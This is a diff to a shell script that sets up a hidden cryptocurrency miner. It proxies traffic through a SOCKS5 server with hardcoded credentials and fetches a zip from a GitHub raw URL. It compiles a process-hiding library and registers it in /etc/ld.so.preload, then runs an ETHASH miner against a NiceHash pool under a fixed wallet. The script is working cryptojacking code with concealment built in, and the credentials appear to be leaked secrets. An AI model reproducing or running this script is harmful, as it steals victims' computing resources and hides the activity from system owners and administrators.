@@ -1,5 +1,4 @@
 #!/bin/sh
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -12,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233 
 loglevel = 1 
-socks5 = 144.22.158.4:1080	
+socks5 = 3.15.39.186:1080 
 socks5_username = mikrotik999 
 socks5_password = Elibawnos 
 END
@@ -46,13 +45,9 @@ chmod +x bezzHash
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 
 unzip magicBezzHash.zip
-
 make
-
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
 mv libprocesshider.so /usr/local/lib/
-
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy.$(echo $(shuf -i 1-9999 -n 1)-X441M) --ethstratum ETHPROXY
